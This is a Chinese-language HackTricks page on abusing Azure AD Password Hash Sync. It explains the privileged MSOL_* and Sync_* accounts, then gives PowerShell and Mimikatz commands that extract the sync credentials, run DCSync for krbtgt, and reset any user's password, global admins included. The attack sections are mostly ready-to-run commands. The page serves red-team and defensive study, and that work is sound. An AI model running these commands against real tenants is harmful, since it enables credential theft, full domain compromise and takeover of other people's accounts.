# Az - PHS - 密码哈希同步

<details>

<summary><strong>从零到英雄学习AWS黑客攻击</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

**密码哈希同步**是用来实现混合身份验证的登录方法之一。**Azure AD Connect** 将用户密码的哈希的哈希从本地Active Directory实例同步到基于云的Azure AD实例。

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

这是公司用来同步本地AD与Azure AD的**最常用方法**。

所有**用户**和**密码哈希的哈希**都从本地同步到Azure AD。然而，**明文密码**或**原始** **哈希**不会发送到Azure AD。\
此外，**内置**安全组（如域管理员等）**不会同步**到Azure AD。

**哈希同步**每**2分钟**发生一次。然而，默认情况下，**密码过期**和**账户** **过期**在Azure AD中**不会同步**。所以，一个**本地密码过期**（未更改）的用户可以继续使用旧密码**访问Azure资源**。

当本地用户想要访问Azure资源时，**认证发生在Azure AD上**。

**PHS**对于像**身份保护**和AAD域服务等功能是必需的。

## 转移

配置PHS时，一些**特权账户**会自动**创建**：

* 账户 **`MSOL_<installationID>`** 会自动在本地AD中创建。该账户被赋予**目录同步账户**角色（参见[文档](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)），这意味着它在本地AD中拥有**复制（DCSync）权限**。
* 在Azure AD中创建了一个账户 **`Sync_<on-prem ADConnect Server名称>_installationID`**。该账户可以**重置任何用户**（已同步或仅限云）在Azure AD中的密码。

这两个特权账户的密码**存储在SQL服务器**上，该服务器位于**Azure AD Connect安装的服务器**上。管理员可以提取这些特权用户的明文密码。\
数据库位于 `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`。

可以从其中一个表中提取配置，其中一个是加密的：

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**加密配置**使用**DPAPI**加密，它包含本地AD中的**`MSOL_*`** 用户的**密码**和AzureAD中的**Sync\_\*** 的密码。因此，危及这些信息可以提升权限到AD和AzureAD。

您可以在[这个演讲中找到这些凭据如何存储和解密的完整概述](https://www.youtube.com/watch?v=JEIR5oGCwdg)。

### 查找 **Azure AD connect服务器**

如果**安装Azure AD connect的服务器**加入了域（文档中推荐的），可以通过以下方式找到它：
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### 滥用 MSOL\_\*
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
您还可以使用 [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) 来获取这些凭据。
{% endhint %}

### 滥用 Sync\_\*

通过攻破 **`Sync_*`** 账户，可以**重置**任何用户（包括全局管理员）的密码
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
它也可以**仅修改云用户的密码**（即使这是意料之外的）
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
也可以转储此用户的密码。

{% hint style="danger" %}
另一个选项是**为服务主体分配特权权限**，**同步**用户有权限这样做，然后**访问该服务主体**作为提权的一种方式。
{% endhint %}

### 无缝 SSO

可以将无缝 SSO 与 PHS 一起使用，这对其他滥用行为是脆弱的。请在以下位置检查：

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## 参考资料

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧**。

</details>
